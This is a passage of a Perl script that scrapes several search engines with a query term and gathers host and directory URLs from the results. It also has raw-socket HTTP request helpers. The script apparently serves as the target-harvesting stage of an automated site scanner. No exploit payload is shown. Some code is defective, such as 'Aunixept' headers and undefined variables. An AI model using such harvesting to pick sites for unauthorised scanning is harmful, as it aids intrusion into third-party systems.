while($inicio <= $pagina){
my $fireball="http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=fb_loc&idx=all&enc=utf-8";
my $Res=query($fireball);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
$av=$av+10;
$inicio++;
}
return @lst;
}
#####
# SUBS UOL
#####
sub uol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# Altavista
#####
sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistade(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistaus(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# HotBot
#####
sub hotbot(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $hot=("http://search.hotbot.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=hb_loc&enc=utf-8".$b);
my $Res=query($hot);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


#####
# Mamma
#####
sub mamma(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $mam=("http://www.mamma.com/Mamma?utfout=$av&qtype=0&query=".key($key)."".$b);
my $Res=query($mam);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# MozBot
#####
sub mozbot()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=100; $i+=1){
my $mozbot=("http://www.mozbot.fr/search?q=".key($key)."&st=int&page=".$i);
my $Res=query($mozbot);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\" target/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAunixept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAunixept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}}
